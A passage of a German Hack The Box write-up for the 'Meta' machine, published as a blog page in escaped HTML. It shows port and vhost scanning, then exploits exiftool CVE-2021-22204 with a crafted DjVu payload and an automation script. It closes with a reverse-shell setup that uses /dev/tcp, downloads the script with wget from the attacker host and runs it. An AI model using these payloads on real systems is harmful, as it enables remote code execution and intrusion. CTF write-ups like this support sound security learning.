+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to http://artcorp.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Warning: OSScan results may be unreliable because we could not find at least &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; open and &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; closed port
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Aggressive OS guesses: Linux 4.15 - 5.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;95%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 5.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 5.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 5.0 - 5.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 5.3 - 5.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 3.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 3.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, AXIS 210A or &lt;span class=&#34;m&#34;&gt;211&lt;/span&gt; Network Camera &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Linux 2.6.17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 2.6.32 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Linux 5.0 - 5.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;94%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; conditions non-ideal&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using port 443/tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HOP RTT      ADDRESS
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   25.91 ms 10.10.14.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   25.95 ms 10.129.140.80
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 37.68 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Es sind zwei Ports geöffnet: 22 (OpenSSH) und 80 (Apache Webserver). Üblicherweise gibt es in OpenSSH wenig zu holen, weshalb ein weiterer Blick auf den Webserver lohnt.&lt;/p&gt;
+&lt;p&gt;Nmap zeigt insbesondere eine Weiterleitung auf &lt;a href=&#34;http://artcorp.htb/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;http://artcorp.htb/&lt;/a&gt;. Dies muss dann in der &lt;code&gt;/etc/hosts&lt;/code&gt;-Datei ergänzt werden.&lt;/p&gt;
+&lt;h3 id=&#34;webserver-artcorphtb&#34;&gt;
+    &lt;a href=&#34;#webserver-artcorphtb&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Webserver: artcorp.htb
+&lt;/h3&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-meta-2.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Die Seite an sich sieht unspektakulär aus. Es scheint sich bei ArtCorp um eine Firma zu handeln, die Software entwickelt. Insbesondere wird gerade das Werkzeug &lt;em&gt;MetaView&lt;/em&gt; entwickelt, ist aber nirgends auf der Seite aufzufinden. Vielleicht gibt es einen Entwicklungs-Server?&lt;/p&gt;
+&lt;h3 id=&#34;webserver-weitere-virtuelle-hosts-finden&#34;&gt;
+    &lt;a href=&#34;#webserver-weitere-virtuelle-hosts-finden&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Webserver: Weitere virtuelle Hosts finden
+&lt;/h3&gt;
+&lt;p&gt;Um weitere virtuelle Hosts zu finden, können verschiedene Tools eingesetzt werden, u. a. &lt;code&gt;FFuF&lt;/code&gt; und &lt;code&gt;gobuster&lt;/code&gt;. Beide Wege führen zum Ziel!&lt;/p&gt;
+&lt;p&gt;Die folgenden Code-Zeilen zeigen beide Wege auf.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://artcorp.htb -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: FUZZ.artcorp.htb&amp;#34;&lt;/span&gt; -t &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -fl &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; -mc &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gobuster vhost -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ergebnis des Scans: Es gibt einen weiteren virtuellen Host auf dem Webserver: &lt;code&gt;dev01.artcorp.htb&lt;/code&gt;. Dies muss in der &lt;code&gt;/etc/hosts&lt;/code&gt;-Datei vermerkt werden und anschließend kann die Seite im Internetbrowser aufgerufen werden.&lt;/p&gt;
+&lt;h3 id=&#34;webserver-dev01artcorphtb&#34;&gt;
+    &lt;a href=&#34;#webserver-dev01artcorphtb&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Webserver: dev01.artcorp.htb
+&lt;/h3&gt;
+&lt;p&gt;Hinter der neu entdeckten Subdomain verbirgt sich die aktuelle Entwickler-Version von &lt;em&gt;MetaView&lt;/em&gt;.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-meta-3.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Nach kurzem Test entpuppt sich die Funktionsfähigkeit wie folgt: Der Benutzer lädt ein Bild Über das Webformular hoch und &lt;em&gt;MetaView&lt;/em&gt; liest die Exit-Daten des Bildes aus und gibt diese auf dem Bildschirm aus. Die Ausgabe gleicht der Ausgabe von &lt;code&gt;exiftool&lt;/code&gt;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;exiftool-remote-code-execution&#34;&gt;
+    &lt;a href=&#34;#exiftool-remote-code-execution&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Exiftool Remote Code Execution
+&lt;/h2&gt;
+&lt;p&gt;Eine kurze Recherche ergibt, dass es eine RCE-Schwachstelle in &lt;code&gt;exiftool&lt;/code&gt; gibt&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;. Die Schwachstelle hat die Nummer CVE-2021-22204&lt;sup id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;4&lt;/a&gt;&lt;/sup&gt; erhalten. Ein Angreifer kann Schadende in einer Bild-Datei verstecken und ausführen. Der verlinkte Artikel beinhaltet eine Schritt-für-Schritt Anleitung mit Proof-of-Concept.&lt;/p&gt;
+&lt;h3 id=&#34;proof-of-concept&#34;&gt;
+    &lt;a href=&#34;#proof-of-concept&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Proof-of-Concept
+&lt;/h3&gt;
+&lt;p&gt;Um zu verifizieren, dass der Server diese Schwachstelle besitzt, werden die folgenden Befehle ausgeführt. Der Schad-Code wird in dem Bild mit dem Namen &lt;code&gt;meta.jpg&lt;/code&gt; versteckt.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;metadata &lt;span class=&#34;s2&#34;&gt;&amp;#34;\c&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; payload
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bzz payload payload.bzz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;djvumake exploit.djvu &lt;span class=&#34;nv&#34;&gt;INFO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1,1&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;BGjp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/null &lt;span class=&#34;nv&#34;&gt;ANTz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;payload.bzz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exiftool -config configfile &lt;span class=&#34;s1&#34;&gt;&amp;#39;-HasselbladExif&amp;lt;=exploit.djvu&amp;#39;&lt;/span&gt; meta.jpg 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Die &lt;code&gt;configfile&lt;/code&gt; hat den folgenden Inhalt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%Image::ExifTool::UserDefined = (
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # All EXIF tags are added to the Main table, and WriteGroup is used to
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # specify where the tag is written (default is ExifIFD if not specified):
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;#39;Image::ExifTool::Exif::Main&amp;#39; =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        # Example 1.  EXIF:NewEXIFTag
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        0xc51b =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Name =&amp;gt; &amp;#39;HasselbladExif&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Writable =&amp;gt; &amp;#39;string&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            WriteGroup =&amp;gt; &amp;#39;IFD0&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        },
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        # add more user-defined EXIF tags here...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    },
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1; #end%
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Anschließend wird das Bild hochgeladen und die Ausgabe auf der Seite kontrolliert: Es hat funktioniert!&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-meta-4.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&#34;exploit-skript&#34;&gt;
+    &lt;a href=&#34;#exploit-skript&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Exploit-Skript
+&lt;/h3&gt;
+&lt;p&gt;Um die Ausnutzung des Exploits einfacher zu gestalten, habe ich ein kurzes Bash-Skript geschrieben, das die Erstellung eines mit Schad-Code behafteten Bildes teil-automatisiert.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-create_payload.sh&#34; data-lang=&#34;create_payload.sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Creating Exploit&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bzz payload payload.bzz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;djvumake exploit.djvu &lt;span class=&#34;nv&#34;&gt;INFO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1,1&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;BGjp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/null &lt;span class=&#34;nv&#34;&gt;ANTz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;payload.bzz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exiftool -config configfile &lt;span class=&#34;s1&#34;&gt;&amp;#39;-HasselbladExif&amp;lt;=exploit.djvu&amp;#39;&lt;/span&gt; meta.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exploit Created. Tidying up...&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm exploit.djvu
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm payload.bzz
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv meta.jpg meta_exploit.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv meta.jpg_original meta.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Done&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Die Datei &lt;code&gt;payload&lt;/code&gt; kann einfach editiert werden. Anschließend wird das Skript ausgeführt, um den Schad-Code in das Bild einzufügen.&lt;/p&gt;
+&lt;h3 id=&#34;reverse-shell-als-www-data&#34;&gt;
+    &lt;a href=&#34;#reverse-shell-als-www-data&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Reverse Shell als www-data
+&lt;/h3&gt;
+&lt;p&gt;Um eine stabile Reverse Shell zu erhalten, musste ich ein wenig herum probieren. Der Weg, der letztlich erfolgreich war, ist der Folgende.&lt;/p&gt;
+&lt;p&gt;Zunächst wird eine Datei mit dem Namen &lt;code&gt;rev.sh&lt;/code&gt; erstellt, die den folgenden Inhalt hat:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rev.sh&#34; data-lang=&#34;rev.sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.140/4444 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Anschließend wird die Datei auf den Server übertragen:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(metadata &amp;#34;\c${system(&amp;#39;wget -O /tmp/rev.sh http://10.10.14.140/rev.sh&amp;#39;)};&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Im letzten Schritt wird die hochgeladene Datei auf dem Server ausgeführt, während ein &lt;code&gt;netcat&lt;/code&gt;-Listener auf der Angreifer-Maschine läuft.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(metadata &amp;#34;\c${system(&amp;#39;bash /tmp/rev.sh&amp;#39;)};&amp;#34;)
